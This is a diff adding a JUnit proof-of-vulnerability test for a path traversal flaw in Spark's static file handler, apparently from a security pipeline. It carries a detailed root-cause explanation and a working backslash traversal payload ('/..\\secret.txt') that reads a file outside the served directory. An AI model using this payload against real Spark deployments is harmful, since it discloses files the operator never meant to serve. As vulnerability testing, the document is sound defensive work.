@@ -1,0 +1,127 @@
+diff --git a/.security-pipeline/pov/PathTraversalPovTest.java b/.security-pipeline/pov/PathTraversalPovTest.java
+new file mode 100644
+index 0000000..eec2554
+--- /dev/null
++++ b/.security-pipeline/pov/PathTraversalPovTest.java
+@@ -0,0 +1,121 @@
++import java.io.File;
++import java.nio.file.Files;
++
++import javax.servlet.http.HttpServletRequest;
++
++import org.junit.After;
++import org.junit.Before;
++import org.junit.Test;
++
++import spark.resource.AbstractFileResolvingResource;
++import spark.resource.ExternalResource;
++import spark.resource.ExternalResourceHandler;
++import spark.utils.IOUtils;
++
++import static org.junit.Assert.assertEquals;
++import static org.junit.Assert.assertNotNull;
++import static org.junit.Assert.assertTrue;
++import static org.mockito.Mockito.mock;
++import static org.mockito.Mockito.when;
++import static org.mockito.Mockito.anyString;
++
++/**
++ * Proof-of-vulnerability for CWE-22 (Path Traversal) in spark.resource.ExternalResourceHandler /
++ * spark.resource.ExternalResource (finding-bb8dd69e7f26).
++ *
++ * Root cause: AbstractResourceHandler.getResource(HttpServletRequest) (AbstractResourceHandler.java:46-59)
++ * builds "pathInContext" from the (attacker-controlled) servlet path/path-info and hands it to
++ * ExternalResourceHandler.getResource(String) (ExternalResourceHandler.java:59-67), which first
++ * "sanitizes" it with UriPath.canonical(path) (UriPath.java:32-34). UriPath.canonical() only
++ * recognizes '/' as a path separator, so a request path using backslashes as directory separators
++ * (a legal segment for javax.servlet's getServletPath()/getPathInfo(), and trivially reachable when
++ * the app or a proxy passes decoded/normalized backslash sequences through) sails through
++ * canonicalization completely unchanged - no ".." segments are seen, so nothing is rejected.
++ *
++ * The already-"canonicalized" (but not actually normalized) path is then concatenated onto the
++ * configured base resource root and handed to `new ExternalResource(addedPath)`
++ * (ExternalResourceHandler.java:69 -> ExternalResource.java:39-40), whose constructor finally calls
++ * StringUtils.cleanPath(path) (ExternalResource.java:40 -> StringUtils.java:218-266). cleanPath DOES
++ * treat backslashes as separators and DOES collapse "..", but - unlike UriPath.canonical() - it never
++ * rejects a path that has more ".." segments than can be consumed: leftover ".." segments are simply
++ * kept/prepended (StringUtils.java:255-266), so the resulting java.io.File silently walks outside the
++ * configured base resource directory. There is no check anywhere afterwards
++ * (AbstractFileResolvingResource.getFile(), StaticFilesConfiguration.consumeWithFileResourceHandlers)
++ * that the resolved File actually still lives under the configured root.
++ *
++ * This test drives the real, public entry point used by every request
++ * (AbstractResourceHandler#getResource(HttpServletRequest)) with a crafted servlet path containing a
++ * backslash-style "..\" sequence and shows that ExternalResourceHandler resolves and serves a file
++ * that lives strictly outside its configured base resource directory.
++ */
++public class PathTraversalPovTest {
++
++    private File tempRoot;
++    private File publicDir;
++    private File secretFile;
++
++    private static final String SECRET_CONTENT = "TOP-SECRET-CONTENT-1234";
++
++    @Before
++    public void setUp() throws Exception {
++        // Configured "public" web root, e.g. Spark's staticFiles.externalLocation("<publicDir>")
++        tempRoot = Files.createTempDirectory("pov-root").toFile();
++        publicDir = new File(tempRoot, "public");
++        publicDir.mkdirs();
++        Files.write(new File(publicDir, "hello.txt").toPath(), "hello world".getBytes());
++
++        // A file that must NOT be reachable through the static file handler: it lives one
++        // directory above the configured base resource root.
++        secretFile = new File(tempRoot, "secret.txt");
++        Files.write(secretFile.toPath(), SECRET_CONTENT.getBytes());
++    }
++
++    @After
++    public void tearDown() {
++        new File(publicDir, "hello.txt").delete();
++        publicDir.delete();
++        secretFile.delete();
++        tempRoot.delete();
++    }
++
++    @Test
++    public void externalResourceHandler_mustNotServeFilesOutsideConfiguredBaseResource() throws Exception {
++        ExternalResourceHandler handler = new ExternalResourceHandler(publicDir.getPath());
++
++        // Simulated malicious, attacker-controlled HTTP request: a Windows-style "..\" traversal
++        // sequence in the servlet path, which UriPath.canonical() does not recognize as containing
++        // ".." segments (it only looks for '/').
++        String maliciousServletPath = "/..\\secret.txt";
++        HttpServletRequest request = mock(HttpServletRequest.class);
++        when(request.getAttribute(anyString())).thenReturn(null);
++        when(request.getServletPath()).thenReturn(maliciousServletPath);
++        when(request.getPathInfo()).thenReturn(null);
++
++        // Real request flow: AbstractResourceHandler.getResource(HttpServletRequest) -> ... ->
++        // ExternalResourceHandler.getResource(String) -> new ExternalResource(...)
++        AbstractFileResolvingResource resource = handler.getResource(request);
++
++        assertNotNull(
++            "Vulnerable behavior expected: ExternalResourceHandler resolved a resource for a "
++                + "'..\\' traversal request path instead of rejecting it",
++            resource);
++
++        ExternalResource externalResource = (ExternalResource) resource;
++        File resolvedFile = new File(externalResource.getPath());
++        String resolvedCanonicalPath = resolvedFile.getCanonicalPath();
++        String baseCanonicalPath = publicDir.getCanonicalPath();
++
++        // The resolved file must have escaped the configured base resource directory.
++        assertTrue(
++            "Vulnerable behavior expected: resolved file '" + resolvedCanonicalPath
++                + "' should lie outside the configured base resource directory '" + baseCanonicalPath + "'",
++            !resolvedCanonicalPath.startsWith(baseCanonicalPath));
++
++        // And it must be exactly the secret file living outside the served root.
++        assertEquals(secretFile.getCanonicalPath(), resolvedCanonicalPath);
++
++        // Prove actual disclosure: the handler happily streams the out-of-root file's content back.
++        byte[] content = IOUtils.toByteArray(resource.getInputStream());
++        assertEquals(SECRET_CONTENT, new String(content));
++    }
++}
